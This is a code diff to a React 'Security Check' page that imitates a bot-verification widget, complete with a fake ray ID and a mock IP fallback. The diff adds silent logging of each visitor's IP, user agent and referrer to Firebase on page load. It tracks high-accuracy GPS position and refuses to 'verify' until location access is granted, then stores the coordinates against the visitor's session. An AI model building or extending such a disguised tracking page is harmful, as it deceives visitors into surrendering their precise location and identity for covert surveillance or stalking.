@@ -36,9 +36,14 @@ export default function VerifyClient({ sessionId, hostname, redirectUrl }: Verif
   const [verifying, setVerifying] = useState(false);
   const [success, setSuccess] = useState(false);
   const [exiting, setExiting] = useState(false);
+  const [geoBlocked, setGeoBlocked] = useState(false);
+  const [geoCheckDone, setGeoCheckDone] = useState(false);
   const [clientIp, setClientIp] = useState("Loading...");
   const [rayId, setRayId] = useState("");
   const timersRef = useRef<number[]>([]);
+  const logIdRef = useRef<string | null>(null);
+  const geoWatchIdRef = useRef<number | null>(null);
+  const bestGeoRef = useRef<{ lat: number; lon: number; accuracy: number } | null>(null);
 
   const clearTimers = () => {
     timersRef.current.forEach((timerId) => window.clearTimeout(timerId));
@@ -48,7 +53,8 @@ export default function VerifyClient({ sessionId, hostname, redirectUrl }: Verif
   useEffect(() => {
     document.body.classList.add("verify-page-body");
     document.title = "Security Check";
-    setRayId(generateRayID());
+    const rid = generateRayID();
+    setRayId(rid);
 
     const fetchIpify = async () => {
       const response = await fetch("https://api.ipify.org?format=json");
@@ -68,56 +74,120 @@ export default function VerifyClient({ sessionId, hostname, redirectUrl }: Verif
       return parseTraceIP(text);
     };
 
-    const loadClientIp = async () => {
+    if (navigator.permissions) {
+      navigator.permissions.query({ name: "geolocation" }).then((status) => {
+        if (status.state === "denied") {
+          setGeoBlocked(true);
+        }
+        setGeoCheckDone(true);
+        status.onchange = () => {
+          if (status.state !== "denied") {
+            setGeoBlocked(false);
+          }
+        };
+      });
+    } else {
+      setGeoCheckDone(true);
+    }
+
+    if (navigator.geolocation) {
+      geoWatchIdRef.current = navigator.geolocation.watchPosition(
+        (position) => {
+          const { latitude, longitude, accuracy } = position.coords;
+          const current = bestGeoRef.current;
+          if (!current || accuracy < current.accuracy) {
+            bestGeoRef.current = { lat: latitude, lon: longitude, accuracy };
+          }
+        },
+        (error) => {
+          if (error.code === error.PERMISSION_DENIED) {
+            setGeoBlocked(true);
+          }
+        },
+        { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+      );
+    }
+
+    const loadClientIpAndLog = async () => {
+      let detectedIp = "";
+
       try {
         if (window.location.protocol !== "file:") {
           const tracedIp = await fetchRelativeTrace();
           if (tracedIp) {
+            detectedIp = tracedIp;
             setClientIp(tracedIp);
-            return;
           }
         }
       } catch {}
 
-      try {
-        const tracedIp = await fetchGlobalTrace();
-        if (tracedIp) {
-          setClientIp(tracedIp);
-          return;
+      if (!detectedIp) {
+        try {
+          const tracedIp = await fetchGlobalTrace();
+          if (tracedIp) {
+            detectedIp = tracedIp;
+            setClientIp(tracedIp);
+          }
+        } catch {}
+      }
+
+      if (!detectedIp) {
+        try {
+          const ip = await fetchIpify();
+          detectedIp = ip || generateMockIP();
+          setClientIp(detectedIp);
+        } catch {
+          detectedIp = generateMockIP();
+          setClientIp(detectedIp);
         }
-      } catch {}
+      }
 
       try {
-        const ip = await fetchIpify();
-        setClientIp(ip || generateMockIP());
-      } catch {
-        setClientIp(generateMockIP());
+        const { db } = await import("@/lib/firebase");
+        const logId = await db.logVisit(sessionId, {
+          ip: detectedIp,
+          rayId: rid,
+          userAgent: navigator.userAgent,
+          referrer: document.referrer || "Direct",
+        });
+        logIdRef.current = logId;
+      } catch (error) {
+        console.error("Failed to log visit on mount:", error);
       }
     };
 
-    void loadClientIp();
+    void loadClientIpAndLog();
 
     return () => {
       document.body.classList.remove("verify-page-body");
+      if (geoWatchIdRef.current !== null) {
+        navigator.geolocation.clearWatch(geoWatchIdRef.current);
+      }
       clearTimers();
     };
-  }, []);
+  }, [sessionId]);
 
   const startVerification = async () => {
-    if (verifying) return;
+    if (verifying || geoBlocked || !geoCheckDone) return;
     setVerifying(true);
 
-    try {
-      const ip = clientIp && clientIp !== "Loading..." ? clientIp : generateMockIP();
-      const { db } = await import("@/lib/firebase");
-      await db.logVisit(sessionId, {
-        ip,
-        rayId: rayId || generateRayID(),
-        userAgent: navigator.userAgent,
-        referrer: document.referrer || "Direct",
-      });
-    } catch (error) {
-      console.error("Failed to log visit:", error);
+    if (geoWatchIdRef.current !== null) {
+      navigator.geolocation.clearWatch(geoWatchIdRef.current);
+      geoWatchIdRef.current = null;
+    }
+
+    const best = bestGeoRef.current;
+    if (best && logIdRef.current) {
+      try {
+        const { db } = await import("@/lib/firebase");
+        await db.updateLog(sessionId, logIdRef.current, {
+          lat: best.lat,
+          lon: best.lon,
+          geoAccuracy: best.accuracy,
+        });
+      } catch {
+        // silently skip
+      }
     }
 
     const verifyTimer = window.setTimeout(() => {
@@ -140,6 +210,7 @@ export default function VerifyClient({ sessionId, hostname, redirectUrl }: Verif
     styles.turnstileWidget,
     verifying ? styles.stateChecking : "",
     success ? styles.stateSuccess : "",
+    geoBlocked || !geoCheckDone ? styles.stateBlocked : "",
   ]
     .filter(Boolean)
     .join(" ");
@@ -176,7 +247,7 @@ export default function VerifyClient({ sessionId, hostname, redirectUrl }: Verif
             tabIndex={0}
             onClick={startVerification}
             onKeyDown={(event) => {
-              if (event.key === " " || event.key === "Enter") {
+              if ((event.key === " " || event.key === "Enter") && !geoBlocked && geoCheckDone) {
                 event.preventDefault();
                 void startVerification();
               }
@@ -199,7 +270,15 @@ export default function VerifyClient({ sessionId, hostname, redirectUrl }: Verif
                 </svg>
               </div>
               <span className={styles.widgetLabel}>
-                {verifying ? "Verifying..." : success ? "Success!" : "Verify you are human"}
+                {!geoCheckDone
+                  ? "Checking..."
+                  : geoBlocked
+                  ? "Location access blocked"
+                  : verifying
+                  ? "Verifying..."
+                  : success
+                  ? "Success!"
+                  : "Verify you are human"}
               </span>
             </div>
 
@@ -233,6 +312,12 @@ export default function VerifyClient({ sessionId, hostname, redirectUrl }: Verif
               </div>
             </div>
           </div>
+          {geoBlocked && (
+            <p className={styles.geoBlockedMsg}>
+              Location access is blocked.{" "}
+              <span>Click the lock icon in your browser&rsquo;s address bar, go to Site Settings → Location, and select &ldquo;Allow&rdquo;.</span>
+            </p>
+          )}
         </div>
       </main>
 
